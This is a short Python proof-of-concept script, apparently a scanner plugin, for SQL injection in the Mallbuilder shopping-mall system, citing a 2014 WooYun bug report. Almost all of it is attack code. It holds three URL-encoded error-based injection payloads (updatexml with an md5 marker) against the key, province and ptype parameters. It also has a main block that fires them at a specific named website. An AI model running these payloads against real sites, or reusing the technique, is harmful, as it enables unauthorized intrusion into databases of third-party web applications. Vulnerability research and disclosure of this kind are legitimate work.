#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  :Mallbuilder商城系统注入之二,三，四
#Author    :  a
#mail      :  a@lcx.cc
#Referer   : http://www.wooyun.org/bugs/wooyun-2014-080751
def assign(service, arg):
    if service == "mallbuilder":
        return True, arg

def audit(arg):
    payloads=['?m=product&s=list&key=%27%20and%201=updateXml%281,concat%280x5c,md5%283.14%29%29,1%29%23',
              '?m=shop&id=&province=%27%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23',
    '?m=product&s=list&ptype=0%27%20%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23']         
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode,finalurl =  curl.curl2(url)
        if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
            security_hole(url)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('mallbuilder', 'http://www.eseein.com/')[1])